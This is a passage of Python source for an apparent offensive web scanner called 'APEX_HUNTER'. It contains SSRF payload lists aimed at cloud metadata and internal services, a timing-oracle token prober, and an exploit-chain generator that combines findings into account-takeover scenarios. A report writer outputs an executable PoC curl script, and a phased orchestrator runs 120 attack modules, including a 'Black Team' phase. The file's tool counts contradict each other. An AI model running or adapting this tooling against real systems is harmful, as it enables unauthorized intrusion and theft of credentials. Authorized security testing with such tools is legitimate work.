                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r:
                    continue
                body = r.body.decode("utf-8", errors="replace") if r.body else ""
                baseline = _fetch(profile.url.rstrip("/") + f"/?{param}=invalidvalue_xyz", cfg.ua, cfg.timeout)
                if not baseline:
                    continue
                base_body = baseline.body.decode("utf-8", errors="replace") if baseline.body else ""
                # If response with juggle payload differs significantly from baseline
                if r.status == 200 and baseline.status != 200:
                    profile.findings.append(Finding(
                        id=f"PHP-JUGGLE-{label.replace(' ','_').upper()[:15]}",
                        title=f"PHP type juggling — '{param}'='{val}' bypassed check ({label})",
                        severity="HIGH",
                        cvss=8.1,
                        cwe="CWE-843",
                        description=f"Parameter '{param}'='{val}' ({label}) returned 200 while invalid value returned {baseline.status}. Possible loose PHP comparison bypass.",
                        poc_curl=f"curl -sk '{url}'",
                        category="Authentication",
                        remediation="Use strict comparison (===) everywhere. Hash passwords with password_hash(). Never compare hashes with ==."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 118: Webhook / Callback SSRF (SKILL-128) ─────────────
class WebhookSSRF:
    """Detect SSRF via webhook, callback URL, and notification endpoint parameters."""
    NAME = "Webhook SSRF"
    WEBHOOK_PATHS = [
        "/api/webhooks", "/api/webhook", "/api/notifications",
        "/api/callbacks", "/api/callback", "/api/integrations",
        "/api/subscriptions", "/api/subscribe", "/api/hooks",
    ]
    WEBHOOK_PARAMS = ["url", "callback", "callback_url", "webhook",
                      "webhook_url", "notify", "notify_url", "endpoint",
                      "target", "destination", "redirect_url"]
    SSRF_TARGETS = [
        ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
        ("http://localhost/server-status", "localhost"),
        ("http://127.0.0.1:6379/", "Redis"),
        ("http://127.0.0.1:8080/", "internal-8080"),
        ("http://[::1]/", "IPv6 localhost"),
        ("http://0.0.0.0:22/", "SSH service"),
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.WEBHOOK_PATHS:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status in (200, 201, 400, 405, 422):
                    poc_lines = []
                    for ssrf_url, label in self.SSRF_TARGETS[:3]:
                        for param in self.WEBHOOK_PARAMS[:3]:
                            poc_lines.append(
                                f"# {label}: curl -sk -X POST {url} "
                                f"-H 'Content-Type: application/json' "
                                f"-d '{{\"url\":\"{ssrf_url}\",\"{param}\":\"{ssrf_url}\"}}'"
                            )
                    profile.findings.append(Finding(
                        id=f"WEBHOOK-SSRF-{path.replace('/','_')[:15].upper()}",
                        title=f"Webhook endpoint exposed — SSRF via callback URL: {path}",
                        severity="HIGH",
                        cvss=8.6,
                        cwe="CWE-918",
                        description=(
                            f"Webhook/callback endpoint {url} responded {r.status}. "
                            "If user-supplied URLs are fetched server-side without validation, "
                            "SSRF to internal services is possible."
                        ),
                        poc_curl="\n".join(poc_lines[:3]),
                        category="SSRF",
                        remediation="Validate webhook URLs against an allowlist. Block RFC1918, loopback, link-local addresses. Use async job queue with network isolation."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 119: Timing Oracle / Secret Enumeration (SKILL-129) ──
class TimingOracleEnum:
    """Detect timing oracles in token comparison endpoints (fixed-length secrets)."""
    NAME = "Timing Oracle"
    import time as _time_mod
    ENUM_PATHS = [
        "/api/verify", "/api/token/verify", "/api/auth/verify",
        "/api/otp/verify", "/api/2fa/verify", "/api/reset/verify",
        "/api/invite/verify", "/api/email/verify",
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import time as _time
        for path in self.ENUM_PATHS:
            url = profile.url.rstrip("/") + path
            # Send two tokens that differ only in first character
            times = []
            for token in ["0" * 32, "f" * 32, "00000000000000000000000000000001"]:
                try:
                    t0 = _time.time()
                    _fetch(url, cfg.ua, 8, "POST",
                           json.dumps({"token": token, "code": token}).encode(),
                           {"Content-Type": "application/json"})
                    times.append(_time.time() - t0)
                except Exception:
                    times.append(0.0)
            if len(times) >= 2 and times[0] > 0 and times[1] > 0:
                delta = abs(times[0] - times[1])
                if delta > 0.1:
                    profile.findings.append(Finding(
                        id="TIMING-ORACLE",
                        title=f"Timing oracle detected on token verification: {path}",
                        severity="MEDIUM",
                        cvss=5.9,
                        cwe="CWE-208",
                        description=(
                            f"Token verification at {path} shows timing delta: "
                            f"t1={times[0]:.3f}s, t2={times[1]:.3f}s (Δ={delta:.3f}s). "
                            "Non-constant-time comparison may allow secret enumeration."
                        ),
                        poc_curl=(
                            f"# Run 100 times and measure: "
                            f"for i in $(seq 100); do "
                            f"curl -sk -w '%{{time_total}}\n' -o /dev/null -X POST {url} "
                            f"-H 'Content-Type: application/json' -d '{{\"token\":\"0\"}}'; done"
                        ),
                        category="Cryptography",
                        remediation="Use constant-time comparison (hmac.compare_digest in Python, MessageDigest.isEqual in Java). Never use == for secret comparison."
                    ))
        return profile

# ── Tool 120: Full Chain PoC Generator (SKILL-130) ────────────
class FullChainPoCGenerator:
    """Auto-generate a prioritized exploit chain PoC combining the scan's highest findings."""
    NAME = "Full Chain PoC Generator"
    CHAIN_PRIORITY = [
        "CRITICAL", "HIGH", "MEDIUM",
    ]
    CHAIN_COMBOS = [
        # XSS + CORS = ATO
        ({"XSS", "CORS"}, "XSS + CORS = Account Takeover", "CRITICAL"),
        # SSRF + Cloud metadata = credential theft
        ({"SSRF"}, "SSRF to Cloud Metadata = IAM credential theft", "CRITICAL"),
        # IDOR + Auth bypass = full account takeover
        ({"IDOR", "Auth"}, "IDOR + Auth Bypass = Account Takeover", "CRITICAL"),
        # Subdomain takeover + CSP bypass
        ({"Subdomain Takeover"}, "Subdomain Takeover → CSP bypass → XSS", "HIGH"),
        # Open redirect + OAuth = token theft
        ({"OAuth", "Redirect"}, "Open Redirect + OAuth = Token Theft", "HIGH"),
        # Cache + reflected = stored-like XSS
        ({"Cache", "XSS"}, "Cache Poisoning + XSS = Stored-like XSS", "HIGH"),
        # LFI + Log = RCE via log poisoning
        ({"LFI"}, "LFI + Log Poisoning = RCE chain", "HIGH"),
        # JWT + CORS = ATO
        ({"JWT", "CORS"}, "JWT Algorithm Confusion + CORS = ATO", "CRITICAL"),
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        if not profile.findings:
            return profile
        cats = {f.category for f in profile.findings}
        ids  = {f.id for f in profile.findings}
        sev_map = {f.id: f.severity for f in profile.findings}
        chains_found = []
        for combo_cats, label, chain_sev in self.CHAIN_COMBOS:
            # Check if any finding category or ID substring matches the combo
            match = any(
                any(c.lower() in cat.lower() or c.lower() in fid.lower()
                    for cat in cats for fid in ids)
                for c in combo_cats
            )
            if match:
                chains_found.append((label, chain_sev))
        # Always produce a top-findings chain
        top = sorted(profile.findings,
                     key=lambda f: {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}.get(f.severity,5))[:5]
        chain_steps = "\n".join(
            f"Step {i+1}: [{f.severity}] {f.title}\n  PoC: {f.poc_curl[:120]}"
            for i, f in enumerate(top))
        extra_chains = "\n".join(f"  [CHAIN] {label} ({sev})" for label, sev in chains_found)
        profile.findings.append(Finding(
            id="FULL-CHAIN-POC",
            title=f"Full chain PoC — {len(top)} findings chained, {len(chains_found)} attack combos identified",
            severity="CRITICAL" if any(s=="CRITICAL" for _,s in chains_found) else "HIGH",
            cvss=10.0 if chains_found else 8.0,
            cwe="CWE-1035",
            description=(
                f"Top-{len(top)} findings exploit chain for {profile.host}:\n"
                f"{chain_steps}"
                + (f"\n\nAttack combos:\n{extra_chains}" if extra_chains else "")
            ),
            poc_curl="\n".join(f.poc_curl[:100] for f in top),
            category="Exploit Chain",
            remediation="Address CRITICAL and HIGH findings first. Prioritise the chains above as they represent real attack scenarios."
        ))
        return profile

# ══════════════════════════════════════════════════════════════
# REPORTER  (SKILL-29, SKILL-30)
# ══════════════════════════════════════════════════════════════
class APEXReporter:
    SEV_ORDER = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
    SEV_COLOR = {"CRITICAL":"#dc3545","HIGH":"#fd7e14","MEDIUM":"#ffc107","LOW":"#17a2b8","INFO":"#6c757d"}

    def __init__(self, out_dir: str):
        self.out = Path(out_dir); self.out.mkdir(parents=True, exist_ok=True)
        self.ts = datetime.now().strftime("%Y%m%d_%H%M%S")

    def _all_findings(self, profiles):
        return sorted(
            [(p.host, f) for p in profiles for f in p.findings],
            key=lambda x: self.SEV_ORDER.get(x[1].severity, 5))

    def save_json(self, profiles):
        path = self.out / f"apex_report_{self.ts}.json"
        data = []
        for p in profiles:
            d = asdict(p); d["findings"] = [asdict(f) for f in p.findings]; data.append(d)
        path.write_text(json.dumps({"generated":self.ts,"tool":"APEX_HUNTER v1.0","targets":data}, indent=2))
        ok(f"  JSON  → {path}")

    def save_csv(self, profiles):
        path = self.out / f"findings_{self.ts}.csv"
        with open(path,"w",newline="") as f:
            w = csv.writer(f)
            w.writerow(["Target","ID","Title","Severity","CVSS","CWE","Category","Description","PoC"])
            for host, fnd in self._all_findings(profiles):
                w.writerow([host, fnd.id, fnd.title, fnd.severity, fnd.cvss,
                            fnd.cwe, fnd.category, fnd.description[:100], fnd.poc_curl[:80]])
        ok(f"  CSV   → {path}")

    def save_markdown(self, profiles):
        path = self.out / f"apex_report_{self.ts}.md"
        sev_counts = Counter(f.severity for _, f in self._all_findings(profiles))
        lines = [
            "# APEX_HUNTER v1.0 — Red Team Report",
            f"**Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  ",
            f"**Targets:** {', '.join(p.host for p in profiles)}",
            "","---","","## Executive Summary","",
            "|Severity|Count|","|-|-|",
        ] + [f"|{s}|{sev_counts.get(s,0)}|" for s in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]]
        lines += ["","---",""]
        for p in profiles:
            lines += [f"## {p.host}","","### Infrastructure",
                f"- IP: {p.ip} ({p.provider})",
                f"- TLS: {p.tls_version} / {p.tls_cipher}",
                f"- Cert: {p.cert_cn} (expires {p.cert_expires})",
                f"- WAF/CDN: {', '.join(p.waf) or 'None detected'}",
                f"- Technologies: {', '.join(p.technologies) or 'None'}",
                f"- Header Score: {p.security_headers.get('score','?')}/100",
                f"- Subdomains: {len(p.subdomains+p.ct_subdomains)} | JS files: {len(p.js_files)} | Secrets: {len(p.secrets)}",
                "","### Findings",""]
            for f in sorted(p.findings, key=lambda x: self.SEV_ORDER.get(x.severity,5)):
                lines += [
                    f"#### [{f.severity}] {f.id}: {f.title}",
                    f"**CWE:** {f.cwe} | **CVSS:** {f.cvss} | **Category:** {f.category}","",
                    f"{f.description}","",
                    "**Evidence:**","```",f.evidence,"```","",
                    "**PoC:**","```bash",f.poc_curl,"```","",
                    f"**Fix:** {f.remediation}","","---",""]
        path.write_text("\n".join(lines))
        ok(f"  MD    → {path}")

    def save_html(self, profiles):
        path = self.out / f"apex_report_{self.ts}.html"
        all_f = self._all_findings(profiles)
        sev_counts = Counter(f.severity for _, f in all_f)
        cards = ""
        for host, f in all_f:
            col = self.SEV_COLOR.get(f.severity,"#6c757d")
            cards += f"""
<div class="card" data-sev="{f.severity}">
  <div class="card-hdr" style="border-left:4px solid {col}">
    <span class="badge" style="background:{col}">{f.severity}</span>
    <b>{f.id}</b> — {html.escape(f.title)}
    <small style="color:#aaa"> | {host}</small>
  </div>
  <div class="card-body">
    <div class="meta">CWE: {f.cwe} &nbsp;|&nbsp; CVSS: {f.cvss} &nbsp;|&nbsp; {f.category}</div>
    <p>{html.escape(f.description)}</p>
    <b>Evidence:</b><pre><code>{html.escape(f.evidence[:500])}</code></pre>
    <b>PoC (curl):</b><pre><code>{html.escape(f.poc_curl)}</code></pre>
    <div class="fix">Fix: {html.escape(f.remediation)}</div>
  </div>
</div>"""
        infra = ""
        for p in profiles:
            infra += f"<tr><td>{p.host}</td><td>{p.ip}</td><td>{p.provider}</td><td>{p.tls_version}</td><td>{', '.join(p.waf) or 'None'}</td><td>{p.security_headers.get('score','?')}/100</td><td>{len(p.findings)}</td></tr>"
        stat_cards = "".join(
            f'<div class="stat"><div class="num" style="color:{self.SEV_COLOR.get(s,"#fff")}">{sev_counts.get(s,0)}</div>{s}</div>'
            for s in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"])
        stat_cards += f'<div class="stat"><div class="num" style="color:#58a6ff">{len(all_f)}</div>TOTAL</div>'
        filter_btns = "".join(
            "<button class=\"btn\" onclick=\"filter('" + s + "')\">" + s + "</button>"
            for s in ["ALL","CRITICAL","HIGH","MEDIUM","LOW","INFO"])
        html_out = f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<title>APEX_HUNTER Report — {datetime.now().strftime('%Y-%m-%d')}</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{background:#0d1117;color:#c9d1d9;font-family:'Segoe UI',monospace;font-size:14px}}
h1,h2{{color:#58a6ff}} h3{{color:#79c0ff;margin:12px 0 6px}}
.wrap{{max-width:1400px;margin:0 auto;padding:20px}}
.hdr{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:20px;margin-bottom:20px}}
.stats{{display:flex;gap:12px;flex-wrap:wrap;margin:16px 0}}
.stat{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:12px 22px;text-align:center}}
.stat .num{{font-size:2em;font-weight:bold}}
.card{{background:#161b22;border:1px solid #30363d;border-radius:8px;margin:12px 0;overflow:hidden}}
.card-hdr{{padding:10px 14px;background:#1c2128;display:flex;align-items:center;gap:10px;flex-wrap:wrap}}
.card-body{{padding:14px}}
.badge{{padding:2px 8px;border-radius:4px;color:#fff;font-size:11px;font-weight:bold}}
pre{{background:#0d1117;border:1px solid #30363d;padding:8px;border-radius:4px;overflow-x:auto;margin:6px 0}}
code{{font-size:12px}}
.meta{{color:#8b949e;margin-bottom:8px}}
.fix{{background:#162032;border-left:3px solid #17a2b8;padding:6px;border-radius:2px;margin-top:8px}}
table{{width:100%;border-collapse:collapse;margin:12px 0}}
th{{background:#1c2128;padding:8px;text-align:left;border:1px solid #30363d;color:#79c0ff}}
td{{padding:8px;border:1px solid #30363d}}
.filters{{margin:12px 0}}
.btn{{padding:5px 12px;border-radius:4px;border:1px solid #30363d;background:#161b22;color:#c9d1d9;cursor:pointer;margin:2px}}
.btn:hover,.btn.active{{background:#58a6ff;color:#000}}
</style></head><body><div class="wrap">
<div class="hdr"><h1>&#x1F6E1; APEX_HUNTER v1.0 — Red Team Report</h1>
<p style="color:#8b949e;margin-top:8px">Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} &nbsp;|&nbsp; 35 Tools &nbsp;|&nbsp; 45 Skills &nbsp;|&nbsp; Targets: {', '.join(p.host for p in profiles)}</p></div>
<div class="stats">{stat_cards}</div>
<h2>Infrastructure</h2>
<table><tr><th>Host</th><th>IP</th><th>Provider</th><th>TLS</th><th>WAF/CDN</th><th>Headers</th><th>Findings</th></tr>{infra}</table>
<h2>Findings ({len(all_f)})</h2>
<div class="filters">
{filter_btns}
</div>
<div id="fc">{cards}</div>
</div>
<script>
function filter(s){{
  document.querySelectorAll('.btn').forEach(b=>b.classList.remove('active'));
  event.target.classList.add('active');
  document.querySelectorAll('.card').forEach(c=>{{
    c.style.display=(s==='ALL'||c.dataset.sev===s)?'':'none';
  }});
}}
document.querySelector('.btn').classList.add('active');
</script></body></html>"""
        path.write_text(html_out)
        ok(f"  HTML  → {path}")

    def save_poc_script(self, profiles):
        path = self.out / f"poc_{self.ts}.sh"
        lines = ["#!/usr/bin/env bash","# APEX_HUNTER v1.0 — PoC Verification","# Run from authorized device with Saudi IP",""]
        for host, f in self._all_findings(profiles):
            lines += [f"","# [{f.severity}] {f.id}: {f.title} | {host}",
                      f"# CWE: {f.cwe} | CVSS: {f.cvss}", f.poc_curl,""]
        path.write_text("\n".join(lines))
        path.chmod(0o755)
        ok(f"  PoC   → {path}")

    def save_burp_templates(self, profiles):
        path = self.out / f"burp_requests_{self.ts}.txt"
        lines = ["# APEX_HUNTER — Burp Suite Request Templates",""]
        for host, f in self._all_findings(profiles):
            if f.burp_request:
                lines += [f"# {f.id}: {f.title}",f.burp_request,"","---",""]
        if len(lines) > 3:
            path.write_text("\n".join(lines))
            ok(f"  Burp  → {path}")

    def run(self, profiles):
        banner("Generating Reports")
        self.save_json(profiles); self.save_csv(profiles)
        self.save_markdown(profiles); self.save_html(profiles)
        self.save_poc_script(profiles); self.save_burp_templates(profiles)

# ══════════════════════════════════════════════════════════════
# ORCHESTRATOR — Auto-chain execution engine
# ══════════════════════════════════════════════════════════════
class APEXOrchestrator:
    PHASE_MAP = {
        1: "Passive OSINT (DNS, TLS, CT Logs, Wayback)",
        2: "WAF + Technology Fingerprinting",
        3: "Security Headers + CSP + CORS + Cookie",
        4: "JavaScript + Sourcemap + Secret Scanning",
        5: "API Mapping + GraphQL + Path Probing + S3",
        6: "Subdomain Takeover + SSRF + IDOR + XSS",
        7: "Advanced: Smuggling + JWT + OAuth + Host Injection + HPP + RateLimit + Cache + SSTI + XXE + ProtoPollu + GQL-Adv + DepConf + BizLogic + WebSocket + BOLA",
        8: "Phase 8: SQLi + NoSQLi + CMDi + Upload + CSRF + Clickjack + MethodTamper + AcctEnum + ACLBypass + APIDowngrade + TLS + ZoneXfer + Deserial + BlindSSRF + EmailInject + JSONP + RefererBypass + 2FA + ErrorIntel + OpenRedirect + HTMLi + CORSPreflight + PwdReset + WebDAV + ContentType + InternalSvc + SubLive + LFI + Session + VDP",
        9: "Phase 9: GQL-Batch + SRI + postMessage + CacheDeception + ServiceWorker + CRLF + SAML + OAuth-Implicit + VHostFuzz + RaceCondition + TokenLeak + CloudMeta-SSRF + ETag + AuthBypassHdr + PathParam + XST + CSS-Inject + CORS-Cred + MassAssign + JWKS + ReDoS + SubTakeoverV2 + HTTP2 + WebSocket-CSWSH + ProtoPollu-Adv + HPP-Adv + IDOR-v2 + ForcedBrowse + SensitiveData + BFLA + GQL-Mutation + CORS-API + SSL-Hints + GQL-FieldSuggest + DepConf-V2 + ErrorHandling + Desync-Adv + OAuth-StateCSRF + DebugEP + BlindCMDi",
        10: "Phase 10 [BLACK TEAM]: Log4Shell + XPathInject + LDAPInject + SSI/ESI + PDF-SSRF + JWT-AlgConf + BlindXXE-OOB + SSTI-RCE + CachePoison-Adv + OAuth-RefererLeak + SOAP/XML + PHP-TypeJuggle + Webhook-SSRF + TimingOracle + FullChainPoC",
    }

    def __init__(self, cfg: Config):
        self.cfg = cfg
        self.reporter = APEXReporter(cfg.output)
        # Instantiate all 35 tools
        self.t01 = DNSResolver(); self.t02 = TLSAnalyzer()
        self.t03 = CTLogScanner(); self.t04 = WaybackMiner()
        self.t05 = WAFDetector(); self.t06 = TechFingerprinter()
        self.t07 = SecurityHeaderAuditor(); self.t08 = CSPAnalyzer()
        self.t09 = CORSAnalyzer(); self.t10 = CookieAuditor()
        self.t11 = JSExtractor(); self.t12 = SourcemapAnalyzer()
        self.t13 = SecretScanner(); self.t14 = APIMapper()
        self.t15 = GraphQLProber(); self.t16 = PathProber()
        self.t17 = S3BucketChecker(); self.t18 = SubdomainTakeoverDetector()
        self.t19 = SSRFDetector(); self.t20 = IDORMapper()
        self.t21 = HTTPSmugglingDetector(); self.t22 = JWTScanner()
        self.t23 = OAuthAnalyzer(); self.t24 = HostHeaderInjector()
        self.t25 = HTTPParameterPollution(); self.t26 = RateLimitBypassTester()
        self.t27 = CachePoisoningDetector(); self.t28 = SSTIScanner()
        self.t29 = XXEProber(); self.t30 = PrototypePollutionScanner()
        self.t31 = GraphQLAdvanced(); self.t32 = DependencyConfusionDetector()
        self.t33 = BusinessLogicProbe(); self.t34 = WebSocketTester()
        self.t35 = IDORDeepScanner()
        # Tools 36-65: Phase 8 (30 Advanced Red Team Skills)
        self.t36 = SQLiScanner(); self.t37 = NoSQLInjection()
        self.t38 = CommandInjectionScanner(); self.t39 = FileUploadTester()
        self.t40 = CSRFDetector(); self.t41 = ClickjackingTester()
        self.t42 = HTTPMethodTampering(); self.t43 = AccountEnumerationTiming()
        self.t44 = PathACLBypass(); self.t45 = APIVersionDowngrade()
        self.t46 = TLSMisconfigScanner(); self.t47 = DNSZoneTransfer()
        self.t48 = DeserializationDetector(); self.t49 = BlindSSRFGenerator()
        self.t50 = EmailHeaderInjection(); self.t51 = JSONPDiscovery()
        self.t52 = RefererACLBypass(); self.t53 = TwoFAEndpointFinder()
        self.t54 = ErrorPageIntelligence(); self.t55 = OpenRedirectChain()
        self.t56 = HTMLInjectionScanner(); self.t57 = CORSPreflightAnalyzer()
        self.t58 = PasswordResetAnalyzer(); self.t59 = WebDAVScanner()
        self.t60 = ContentTypeConfusion(); self.t61 = InternalServiceDiscovery()
        self.t62 = SubdomainLiveCheck(); self.t63 = LFIScanner()
        self.t64 = SessionSecurityAnalyzer(); self.t65 = VDPDiscovery()
        # Tools 66-105: Phase 9 (40 Advanced Red Team Skills)
        self.t66 = GraphQLBatchAttack(); self.t67 = SRIChecker()
        self.t68 = PostMessageAnalyzer(); self.t69 = WebCacheDeception()
        self.t70 = ServiceWorkerAudit(); self.t71 = CRLFInjectionScanner()
        self.t72 = SAMLVulnScanner(); self.t73 = OAuth2ImplicitFlow()
        self.t74 = VHostFuzzer(); self.t75 = RaceConditionTester()
        self.t76 = TokenLeakageScanner(); self.t77 = CloudMetadataSSRF()
        self.t78 = ETagLeakage(); self.t79 = APIAuthBypassHeaders()
        self.t80 = PathParameterInjection(); self.t81 = HTTPTraceXST()
        self.t82 = CSSInjectionScanner(); self.t83 = CORSCredentialExposure()
        self.t84 = MassAssignmentFuzzer(); self.t85 = JWKSPoisoning()
        self.t86 = ReDoSProbe(); self.t87 = SubdomainTakeoverV2()
        self.t88 = HTTP2RapidReset(); self.t89 = WebSocketHijacking()
        self.t90 = PrototypePollutionAdvanced(); self.t91 = HPPAdvanced()
        self.t92 = IDORv2(); self.t93 = ForcedBrowsing()
        self.t94 = SensitiveDataExposure(); self.t95 = BFLAScanner()
        self.t96 = GraphQLMutationFuzzer(); self.t97 = InsecureCORSOnAPI()
        self.t98 = SSLPinningBypassHints(); self.t99 = GraphQLFieldSuggestionLeak()
        self.t100 = DependencyConfusionV2(); self.t101 = ImproperErrorHandling()
        self.t102 = HTTPDesyncAdvanced(); self.t103 = OAuthStateCSRF()
        self.t104 = ExposedDebugEndpoints(); self.t105 = BlindCMDInjection()
        # Tools 106-125: Phase 10 (20 Black Team Skills)
        self.t106 = Log4ShellScanner(); self.t107 = XPathInjection()
        self.t108 = LDAPInjection(); self.t109 = SSIInjection()
        self.t110 = PDFGeneratorSSRF(); self.t111 = JWTAlgorithmConfusion()
        self.t112 = BlindXXEOOB(); self.t113 = SSTIRCEChain()
        self.t114 = CachePoisoningAdvanced(); self.t115 = OAuthTokenRefererLeak()
        self.t116 = SOAPXMLInjection(); self.t117 = PHPTypeJuggling()
        self.t118 = WebhookSSRF(); self.t119 = TimingOracleEnum()
        self.t120 = FullChainPoCGenerator()

    def _init_profile(self, url: str) -> TargetProfile:
        p = urlparse(url)
        host = p.hostname or url
        apex = ".".join(host.split(".")[-2:]) if host else host
        return TargetProfile(url=url, apex=apex, host=host, scheme=p.scheme)

    def _run_phase(self, n: int, p: TargetProfile) -> TargetProfile:
        banner(f"Phase {n}: {self.PHASE_MAP[n]}")
        cfg = self.cfg
        try:
            if n == 1:
                p = self.t01.run(p); p = self.t02.run(p)
                p = self.t03.run(p); p = self.t04.run(p)
            elif n == 2:
                p = self.t05.run(p, cfg); p = self.t06.run(p, cfg)
            elif n == 3:
                p = self.t07.run(p, cfg); p = self.t08.run(p, cfg)
                p = self.t09.run(p, cfg); p = self.t10.run(p, cfg)
            elif n == 4:
                p = self.t11.run(p, cfg); p = self.t12.run(p, cfg)
                p = self.t13.run(p, cfg)
            elif n == 5:
                p = self.t14.run(p, cfg); p = self.t15.run(p, cfg)
                p = self.t16.run(p, cfg); p = self.t17.run(p, cfg)
            elif n == 6:
                p = self.t18.run(p, cfg); p = self.t19.run(p, cfg)
                p = self.t20.run(p, cfg)
            elif n == 7:
                p = self.t21.run(p, cfg); p = self.t22.run(p, cfg)
                p = self.t23.run(p, cfg); p = self.t24.run(p, cfg)
                p = self.t25.run(p, cfg); p = self.t26.run(p, cfg)
                p = self.t27.run(p, cfg); p = self.t28.run(p, cfg)
                p = self.t29.run(p, cfg); p = self.t30.run(p, cfg)
                p = self.t31.run(p, cfg); p = self.t32.run(p, cfg)
                p = self.t33.run(p, cfg); p = self.t34.run(p, cfg)
                p = self.t35.run(p, cfg)
            elif n == 8:
                p = self.t36.run(p, cfg); p = self.t37.run(p, cfg)
                p = self.t38.run(p, cfg); p = self.t39.run(p, cfg)
                p = self.t40.run(p, cfg); p = self.t41.run(p, cfg)
                p = self.t42.run(p, cfg); p = self.t43.run(p, cfg)
                p = self.t44.run(p, cfg); p = self.t45.run(p, cfg)
                p = self.t46.run(p, cfg); p = self.t47.run(p, cfg)
                p = self.t48.run(p, cfg); p = self.t49.run(p, cfg)
                p = self.t50.run(p, cfg); p = self.t51.run(p, cfg)
                p = self.t52.run(p, cfg); p = self.t53.run(p, cfg)
                p = self.t54.run(p, cfg); p = self.t55.run(p, cfg)
                p = self.t56.run(p, cfg); p = self.t57.run(p, cfg)
                p = self.t58.run(p, cfg); p = self.t59.run(p, cfg)
                p = self.t60.run(p, cfg); p = self.t61.run(p, cfg)
                p = self.t62.run(p, cfg); p = self.t63.run(p, cfg)
                p = self.t64.run(p, cfg); p = self.t65.run(p, cfg)
            elif n == 9:
                p = self.t66.run(p, cfg); p = self.t67.run(p, cfg)
                p = self.t68.run(p, cfg); p = self.t69.run(p, cfg)
                p = self.t70.run(p, cfg); p = self.t71.run(p, cfg)
                p = self.t72.run(p, cfg); p = self.t73.run(p, cfg)
                p = self.t74.run(p, cfg); p = self.t75.run(p, cfg)
                p = self.t76.run(p, cfg); p = self.t77.run(p, cfg)
                p = self.t78.run(p, cfg); p = self.t79.run(p, cfg)
                p = self.t80.run(p, cfg); p = self.t81.run(p, cfg)
                p = self.t82.run(p, cfg); p = self.t83.run(p, cfg)
                p = self.t84.run(p, cfg); p = self.t85.run(p, cfg)
                p = self.t86.run(p, cfg); p = self.t87.run(p, cfg)
                p = self.t88.run(p, cfg); p = self.t89.run(p, cfg)
                p = self.t90.run(p, cfg); p = self.t91.run(p, cfg)
                p = self.t92.run(p, cfg); p = self.t93.run(p, cfg)
                p = self.t94.run(p, cfg); p = self.t95.run(p, cfg)
                p = self.t96.run(p, cfg); p = self.t97.run(p, cfg)
                p = self.t98.run(p, cfg); p = self.t99.run(p, cfg)
                p = self.t100.run(p, cfg); p = self.t101.run(p, cfg)
                p = self.t102.run(p, cfg); p = self.t103.run(p, cfg)
                p = self.t104.run(p, cfg); p = self.t105.run(p, cfg)
            elif n == 10:
                p = self.t106.run(p, cfg); p = self.t107.run(p, cfg)
                p = self.t108.run(p, cfg); p = self.t109.run(p, cfg)
                p = self.t110.run(p, cfg); p = self.t111.run(p, cfg)
                p = self.t112.run(p, cfg); p = self.t113.run(p, cfg)
                p = self.t114.run(p, cfg); p = self.t115.run(p, cfg)
                p = self.t116.run(p, cfg); p = self.t117.run(p, cfg)
                p = self.t118.run(p, cfg); p = self.t119.run(p, cfg)
                p = self.t120.run(p, cfg)
        except KeyboardInterrupt:
            warn("Interrupted — saving partial results...")
        except Exception as e:
            warn(f"Phase {n} error: {e}")
        return p

    def run(self) -> List[TargetProfile]:
        SEP = "═" * 70
        print(f"\n{C.BOLD}{C.WHITE}{SEP}{C.NC}")
        print(f"{C.BOLD}{C.CYAN}  APEX_HUNTER v1.0{C.NC}")
        print(f"{C.WHITE}  120 Tools | 130 Skills | Auto-Chain Execution{C.NC}")
        print(f"{C.WHITE}{SEP}{C.NC}")
        print(f"  Targets : {', '.join(self.cfg.targets)}")
        print(f"  Output  : {self.cfg.output}")
        print(f"  Phases  : {self.cfg.phases}")
        print(f"  Workers : {self.cfg.workers} | Rate: {self.cfg.rate} r/s | Depth: {self.cfg.depth}")
        print(f"{C.WHITE}{SEP}{C.NC}\n")
        profiles = []
        for target in self.cfg.targets:
            banner(f"TARGET: {target}")
            profile = self._init_profile(target)
            for phase in sorted(self.cfg.phases):
                profile = self._run_phase(phase, profile)
                time.sleep(0.5 / self.cfg.rate)
            profiles.append(profile)
            # Per-target summary
            cnts = Counter(f.severity for f in profile.findings)
            banner(f"Summary — {profile.host}")
            for sev, col in [("CRITICAL",C.RED),("HIGH",C.RED),("MEDIUM",C.YELLOW),("LOW",C.CYAN),("INFO",C.DIM)]:
                if cnts.get(sev): print(f"  {col}{sev}: {cnts[sev]}{C.NC}")
        self.reporter.run(profiles)
        banner("Complete")
        ok(f"Total findings: {sum(len(p.findings) for p in profiles)} across {len(profiles)} target(s)")
        ok(f"Reports: {self.cfg.output}/")
        return profiles

# ══════════════════════════════════════════════════════════════
# SKILLS INDEX
# ══════════════════════════════════════════════════════════════
SKILLS_INDEX = """
APEX_HUNTER v1.0 — Skills Index (130 Skills / 120 Tools)
═════════════════════════════════════════════════════════
SKILL-01  DNS resolution & multi-record enumeration
SKILL-02  TLS version, cipher, certificate, SAN extraction
SKILL-03  Certificate Transparency log mining (crt.sh)
SKILL-04  Wayback Machine CDX API URL + parameter mining
SKILL-05  WAF/CDN fingerprinting (14 provider signatures)
SKILL-06  Technology stack detection (30 signatures)
SKILL-07  HTTP security header audit & scoring (10 headers / 100pts)
SKILL-08  CSP weakness analysis (8 patterns)
SKILL-09  CORS misconfiguration testing (6 origin bypass patterns)
SKILL-10  Cookie security attribute audit (Secure/HttpOnly/SameSite/__Host-)
SKILL-11  JavaScript file discovery + endpoint/parameter extraction
SKILL-12  Webpack sourcemap discovery + source file enumeration
